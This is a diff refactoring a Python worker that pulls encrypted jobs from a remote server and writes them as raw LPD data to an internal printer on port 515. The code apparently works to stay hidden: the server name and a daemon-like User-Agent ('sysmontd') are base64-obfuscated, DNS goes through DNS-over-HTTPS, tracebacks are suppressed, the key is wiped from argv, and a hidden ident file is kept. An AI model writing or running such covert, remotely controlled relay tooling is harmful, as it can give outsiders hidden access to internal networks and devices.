@@ -16,26 +16,33 @@ sys.dont_write_bytecode = True
 sys.tracebacklimit = 0
 disable()
 
-def _sleep_inhibit(on: bool = True) -> None:
+def sleep_block(on: bool = True) -> None:
     if sys.platform == "win32":
         try: ctypes.windll.kernel32.SetThreadExecutionState(0x80000001 if on else 0x80000000)
         except Exception: pass
 
-def _cleanup() -> None:
-    global _k
-    _k = ""
-    _sleep_inhibit(False)
+def clean_state() -> None:
+    global app_key, conn_claim
+    app_key = ""
+    if conn_claim:
+        try: conn_claim.close()
+        except Exception: pass
+        conn_claim = None
+    sleep_block(False)
     collect()
 
-atexit.register(_cleanup)
+atexit.register(clean_state)
 
 try:
-    signal.signal(signal.SIGINT, lambda s, f: ( _cleanup(), sys.exit(0) ))
-    signal.signal(signal.SIGTERM, lambda s, f: ( _cleanup(), sys.exit(0) ))
+    signal.signal(signal.SIGINT, lambda s, f: ( clean_state(), sys.exit(0) ))
+    signal.signal(signal.SIGTERM, lambda s, f: ( clean_state(), sys.exit(0) ))
 except Exception: pass
 
-def _load_key() -> str:
-    k = os.environ.get("WORKER_KEY", "").strip()
+def load_key() -> str:
+    k = ""
+    for name in ("PRINTER_KEY", "KEY", "WORKER_KEY"):
+        k = os.environ.get(name, "").strip()
+        if k: break
     if not k and len(sys.argv) > 1 and not sys.argv[1].startswith("-"):
         k = sys.argv[1].strip()
     if sys.platform == "win32" and k.startswith("DPAPI:"):
@@ -52,24 +59,24 @@ def _load_key() -> str:
                 k = dec
         except Exception: pass
     if not k:
-        sys.stderr.write("error: worker key required\n")
+        sys.stderr.write("error: key required\n")
         sys.exit(1)
     if len(sys.argv) > 1: sys.argv[1] = " " * len(sys.argv[1])
     return k
 
-_k = _load_key()
-_debug = "--debug" in sys.argv
+app_key = load_key()
+app_debug = "--debug" in sys.argv
 
-def _log(msg: str, level: str = "OK") -> None:
-    if _debug or level in ("ERR", "WARN"):
+def log_msg(msg: str, level: str = "OK") -> None:
+    if app_debug or level in ("ERR", "WARN"):
         sys.stderr.write(f"[{level}] {msg}\n")
         sys.stderr.flush()
 
-_doh_cache: Dict[str, Tuple[str, float]] = {}
+doh_cache: Dict[str, Tuple[str, float]] = {}
 
-def doh_resolve(domain: str) -> str:
+def resolve_doh(domain: str) -> str:
     now = time()
-    if domain in _doh_cache and now - _doh_cache[domain][1] < 300: return _doh_cache[domain][0]
+    if domain in doh_cache and now - doh_cache[domain][1] < 300: return doh_cache[domain][0]
     try:
         req = Request(f"https://1.1.1.1/dns-query?name={domain}&type=A", headers={"Accept": "application/dns-json"})
         with urlopen(req, timeout=2.0) as resp:
@@ -77,39 +84,60 @@ def doh_resolve(domain: str) -> str:
                 for a in loads(resp.read().decode()).get("Answer", []):
                     if a.get("type") == 1:
                         ip = str(a.get("data"))
-                        _doh_cache[domain] = (ip, now)
+                        doh_cache[domain] = (ip, now)
                         return ip
     except Exception: pass
     return domain
 
-_DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
+api_host = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
+ssl_ctx = create_default_context()
+conn_claim: Optional[HTTPSConnection] = None
+lock_claim = Lock()
 
-def _http_req(path: str, headers: Optional[Dict[str, str]] = None, data: Optional[bytes] = None, timeout: Optional[float] = None) -> Any:
-    ip = doh_resolve(_DOM)
-    hdrs_dict = dict(headers or {})
-    hdrs_dict["Host"] = _DOM
-    if ip and ip != _DOM:
+def claim_conn() -> HTTPSConnection:
+    global conn_claim
+    ip = resolve_doh(api_host)
+    target = ip if (ip and ip != api_host) else api_host
+    if conn_claim is None:
+        conn_claim = HTTPSConnection(target, 443, timeout=5.0, context=ssl_ctx)
+        conn_claim.host = api_host
+    return conn_claim
+
+def reset_claim() -> None:
+    global conn_claim
+    if conn_claim:
+        try: conn_claim.close()
+        except Exception: pass
+        conn_claim = None
+
+def http_req(path: str, headers: Optional[Dict[str, str]] = None, data: Optional[bytes] = None, timeout: Optional[float] = None) -> Any:
+    ip = resolve_doh(api_host)
+    hdrs = dict(headers or {})
+    hdrs["Host"] = api_host
+    if ip and ip != api_host:
         try:
-            conn = HTTPSConnection(ip, 443, timeout=timeout or 300.0, context=create_default_context())
-            conn.host = _DOM
-            conn.request("POST" if data is not None else "GET", path, body=data, headers=hdrs_dict)
+            conn = HTTPSConnection(ip, 443, timeout=timeout or 300.0, context=ssl_ctx)
+            conn.host = api_host
+            conn.request("POST" if data is not None else "GET", path, body=data, headers=hdrs)
             return conn.getresponse()
         except Exception: pass
-    req = Request(f"https://{_DOM}{path}", headers=hdrs_dict, data=data)
-    return urlopen(req, timeout=timeout, context=create_default_context()) if timeout else urlopen(req, context=create_default_context())
+    req = Request(f"https://{api_host}{path}", headers=hdrs, data=data)
+    return urlopen(req, timeout=timeout, context=ssl_ctx) if timeout else urlopen(req, context=ssl_ctx)
 
 NUL = b"\x00"
-jobs = 0
-_claims = 0
-_claims_lock = Lock()
-_worker_busy = Lock()
+job_count = 0
+claim_count = 0
+lock_count = Lock()
+app_busy = Lock()
+pending_job: Optional[Dict[str, Any]] = None
+lock_pending = Lock()
 
-def _d(s: str, job_id: Union[str, int] = "") -> bytes:
+def decrypt_data(s: str, job_id: Union[str, int] = "") -> bytes:
     if not s: return b""
     raw = b64decode(s)
     if len(raw) < 16: return b""
     iv, enc = raw[:16], raw[16:]
-    p = sha256(_k.encode() + iv + str(job_id).encode()).digest()
+    p = sha256(app_key.encode() + iv + str(job_id).encode()).digest()
     out = bytearray(len(enc))
     for idx, i in enumerate(range(0, len(enc), 32)):
         c = enc[i : i + 32]
@@ -121,35 +149,35 @@ def _d(s: str, job_id: Union[str, int] = "") -> bytes:
         except Exception: pass
     return res
 
-_online: Dict[str, Tuple[bool, float]] = {}
-_online_lock = Lock()
+host_cache: Dict[str, Tuple[bool, float]] = {}
+lock_host = Lock()
 
 def is_online(host: str) -> bool:
     if not host: return False
     now = time()
-    with _online_lock:
-        if host in _online and now - _online[host][1] < 3.0:
-            return _online[host][0]
+    with lock_host:
+        if host in host_cache and now - host_cache[host][1] < 3.0:
+            return host_cache[host][0]
     try:
         s = create_connection((host, 515), timeout=0.5)
         try: s.shutdown(2)
         except Exception: pass
         s.close()
-        with _online_lock: _online[host] = (True, now)
+        with lock_host: host_cache[host] = (True, now)
         return True
     except Exception:
-        with _online_lock: _online[host] = (False, now)
+        with lock_host: host_cache[host] = (False, now)
         return False
 
-def _probe_loop() -> None:
+def probe_loop() -> None:
     while True:
-        with _online_lock:
-            hosts = list(_online.keys())
+        with lock_host:
+            hosts = list(host_cache.keys())
         for h in hosts:
             is_online(h)
-        sleep(1.5)
+        sleep(3.0)
 
-def _ident() -> str:
+def init_id() -> str:
     path = "C:\\ProgramData\\.ident" if sys.platform == "win32" else "/tmp/.ident"
     try:
         if os.path.exists(path):
@@ -162,133 +190,144 @@ def _ident() -> str:
     except Exception:
         return f"{uuid.uuid4()};{platform.machine().lower()}"
 
-_WORKER_IDENT = _ident()
-_UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
+app_ident = init_id()
+app_ua = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
 
-def _make_jwt() -> str:
+def make_jwt() -> str:
     def b64u(b: bytes) -> str: return urlsafe_b64encode(b).rstrip(b"=").decode()
     h, p = b64u(b'{"alg":"HS256","typ":"JWT"}'), b64u(b'{"sub":"printer","iss":"preconnect"}')
-    sig = b64u(hmac_new(_k.encode(), f"{h}.{p}".encode(), sha256).digest())
+    sig = b64u(hmac_new(app_key.encode(), f"{h}.{p}".encode(), sha256).digest())
     return f"{h}.{p}.{sig}"
 
-_cached_jwt = _make_jwt()
+cached_jwt = make_jwt()
 
-def hdrs() -> Dict[str, str]:
+def get_hdrs() -> Dict[str, str]:
     return {
-        "User-Agent": _UA,
-        "Authorization": f"Bearer {_cached_jwt}",
-        "X-Worker-Key": _k,
-        "X-Worker-Jobs": str(jobs),
-        "X-Worker-Ident": _WORKER_IDENT,
+        "User-Agent": app_ua,
+        "Authorization": f"Bearer {cached_jwt}",
+        "X-Worker-Key": app_key,
+        "X-Worker-Jobs": str(job_count),
+        "X-Worker-Ident": app_ident,
     }
 
-def claim(i: Union[str, int]) -> bool:
-    global _claims
+def claim_job(i: Union[str, int]) -> bool:
+    global claim_count
     if not i: return True
-    with _claims_lock:
-        if _claims >= 3:
+    with lock_count:
+        if claim_count >= 3:
             sleep(1.0)
-            _claims = 0
+            claim_count = 0
+    body = f'{{"id":"{i}"}}'.encode()
+    hdrs = {"Content-Type": "application/json", **get_hdrs()}
     for _ in range(3):
-        try:
-            with _http_req("/print/claim", headers={"Content-Type": "application/json", **hdrs()}, data=f'{{"id":"{i}"}}'.encode(), timeout=5.0) as resp:
+        with lock_claim:
+            try:
+                conn = claim_conn()
+                conn.request("POST", "/print/claim", body=body, headers=hdrs)
+                resp = conn.getresponse()
                 if resp.status == 200:
                     ok = bool(loads(resp.read().decode()).get("claimed"))
                     if ok:
-                        with _claims_lock: _claims += 1
+                        with lock_count: claim_count += 1
                     return ok
+                reset_claim()
                 return False
-        except Exception: sleep(0.15)
+            except Exception:
+                reset_claim()
+                sleep(0.15)
     return False
 
-def handle(j: Dict[str, Any]) -> None:
-    global jobs
-    if not _worker_busy.acquire(blocking=False): return
-    _sleep_inhibit(True)
+def send_job(j: Dict[str, Any]) -> None:
+    global job_count
     host = j.get("printerHost") or "172.16.0.111"
     queue = j.get("printerQueue") or "secure"
     job_id = str(j.get("id", ""))
-    if not host or not is_online(host) or (job_id and not claim(job_id)):
-        _sleep_inhibit(False)
-        _worker_busy.release()
+    if not host or not is_online(host) or (job_id and not claim_job(job_id)):
         return
     s: Optional[socket] = None
     try:
-        q, ch, c, dh, p = [_d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")]
-        if not p:
-            _sleep_inhibit(False)
-            _worker_busy.release()
-            return
-        _log(f"Handling job for {host}:{queue} ({len(p)} bytes)")
+        q, ch, c, dh, p = [decrypt_data(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")]
+        if not p: return
+        log_msg(f"Handling job for {host}:{queue} ({len(p)} bytes)")
         s = create_connection((host, 515), timeout=float(j.get("timeout", 60) or 60))
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
         s.setsockopt(SOL_SOCKET, SO_SNDBUF, 65536)
         for data, add_nul in [(q, False), (ch, False), (c, True), (dh, False)]:
             s.sendall(data + (NUL if add_nul else b""))
-            if s.recv(1) != NUL:
-                _sleep_inhibit(False)
-                _worker_busy.release()
-                return
+            if s.recv(1) != NUL: return
         mv = memoryview(p)
         for i in range(0, len(p), 65536): s.sendall(mv[i : i + 65536])
         s.sendall(NUL)
-        if s.recv(1) != NUL:
-            _sleep_inhibit(False)
-            _worker_busy.release()
-            return
-        jobs += 1
-        _log("Job transferred successfully")
+        if s.recv(1) != NUL: return
+        job_count += 1
+        log_msg("Job transferred successfully")
     except Exception as e:
-        _log(f"Transfer error: {e}", "ERR")
-        if s:
-            try: s.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
-            except Exception: pass
+        log_msg(f"Transfer error: {e}", "ERR")
     finally:
         if s:
             try: s.shutdown(2)
             except Exception: pass
             try: s.close()
             except Exception: pass
-        _sleep_inhibit(False)
-        _worker_busy.release()
 
-_last_id = ""
-
-def stream() -> None:
-    global _last_id
+def job_loop(initial_job: Dict[str, Any]) -> None:
+    global pending_job
     try:
-        h = {"Accept": "text/event-stream", **hdrs()}
-        if _last_id: h["Last-Event-ID"] = _last_id
-        with _http_req("/printer", headers=h, timeout=None) as r:
+        sleep_block(True)
+        curr = initial_job
+        while curr:
+            send_job(curr)
+            with lock_pending:
+                curr, pending_job = pending_job, None
+    finally:
+        sleep_block(False)
+        app_busy.release()
+
+def queue_job(j: Dict[str, Any]) -> None:
+    global pending_job
+    if app_busy.acquire(blocking=False):
+        Thread(target=job_loop, args=(j,), daemon=True).start()
+    else:
+        with lock_pending:
+            pending_job = j
+
+last_id = ""
+
+def sse_loop() -> None:
+    global last_id
+    try:
+        h = {"Accept": "text/event-stream", **get_hdrs()}
+        if last_id: h["Last-Event-ID"] = last_id
+        with http_req("/printer", headers=h, timeout=None) as r:
             if r.status == 401:
-                sys.stderr.write("error: worker key invalid (401)\n")
-                _cleanup()
+                sys.stderr.write("error: key invalid (401)\n")
+                clean_state()
                 sys.exit(1)
             if r.status != 200: return
             while line := r.readline():
                 if line.startswith(b":") or not line.strip(): continue
-                if line.startswith(b"id: "): _last_id = line[4:].strip().decode("utf-8", "ignore")
+                if line.startswith(b"id: "): last_id = line[4:].strip().decode("utf-8", "ignore")
                 elif line.startswith(b"data: "):
-                    try: Thread(target=handle, args=(loads(line[6:].decode("utf-8", "replace")),), daemon=True).start()
+                    try: queue_job(loads(line[6:].decode("utf-8", "replace")))
                     except Exception: pass
     except Exception: pass
 
-def _ping() -> None:
+def ping_loop() -> None:
     while True:
-        try: _http_req("/print/ping", headers={"Content-Type": "application/json", **hdrs()}, data=b"{}", timeout=5.0)
+        try: http_req("/print/ping", headers={"Content-Type": "application/json", **get_hdrs()}, data=b"{}", timeout=5.0)
         except Exception: pass
-        sleep(5.0)
+        sleep(15.0)
 
 if __name__ == "__main__":
     is_online("172.16.0.111")
     sleep(0.2)
-    Thread(target=_probe_loop, daemon=True).start()
-    Thread(target=_ping, daemon=True).start()
+    Thread(target=probe_loop, daemon=True).start()
+    Thread(target=ping_loop, daemon=True).start()
     delay = 1.0
     while True:
-        _log(f"Stream connect; Jobs: {jobs}")
+        log_msg(f"Stream connect; Jobs: {job_count}")
         t0 = time()
-        stream()
+        sse_loop()
         delay = 1.0 if (time() - t0) > 10.0 else min(delay * 2.0, 8.0)
         sleep(delay)
